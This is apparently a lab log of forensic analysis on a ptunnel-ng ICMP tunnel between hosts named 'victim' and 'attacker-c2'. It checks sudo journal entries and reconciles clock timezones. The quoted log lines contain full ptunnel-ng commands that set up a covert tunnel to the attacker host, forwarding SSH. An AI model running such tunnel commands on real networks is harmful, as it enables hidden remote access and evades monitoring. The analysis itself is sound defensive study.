# Stage 3 — Analysis of Event Logs and Network Logs

Running log of the Stage 3 process: steps taken, commands used, and any
troubleshooting encountered during log analysis.

## 2026-11-22

Checked /var/log/auth.log on victim for ptunnel-ng sudo invocations
(`sudo grep ptunnel /var/log/auth.log`) - no matches found (this system
does not log sudo invocations to auth.log). Switched to systemd journal
instead: `sudo journalctl _COMM=sudo | grep -i ptunnel` returned the full
history of sudo-elevated ptunnel-ng launches on victim, including the one
matching the final Stage 1 evidence capture:

Nov 20 02:39:42 victim sudo[4141]: victim : TTY=/dev/pts/0 ;
PWD=/home/victim/ptunnel-ng ; USER=root ;
COMMAND=/home/victim/ptunnel-ng/src/ptunnel-ng -p 192.168.100.20 -l 2222
-r192.168.100.20 -R22

Also checked victim's system clock (`date`): Sun Nov 22 04:18:59 AM +05
2026 - correct, no clock drift (unlike the previous project attempt).

Switched to attacker-c2 and ran the same check:
`sudo journalctl _COMM=sudo | grep -i ptunnel`

Nov 19 21:37:53 attacker-c2 sudo[1473]: attacker-c2 : TTY=/dev/tty1 ;
PWD=/home/attacker-c2/ptunnel-ng ; USER=root ;
COMMAND=/home/attacker-c2/ptunnel-ng/src/ptunnel-ng -r0.0.0.0 -R22

attacker-c2's clock is in UTC (`date` -> Sun Nov 22 09:58:15 AM UTC 2026),
while victim's clock is UTC+5 (Asia/Qyzylorda). Converting victim's
client-launch timestamp (2026-11-20 02:39:42 +05) to UTC gives
2026-11-19 21:39:42 UTC - about 2 minutes after the attacker-c2 server
start (21:37:53 UTC). This confirms the expected sequence: C2 server
started first on attacker-c2, followed by the client connection from
victim, matching the collection order used in Stage 1.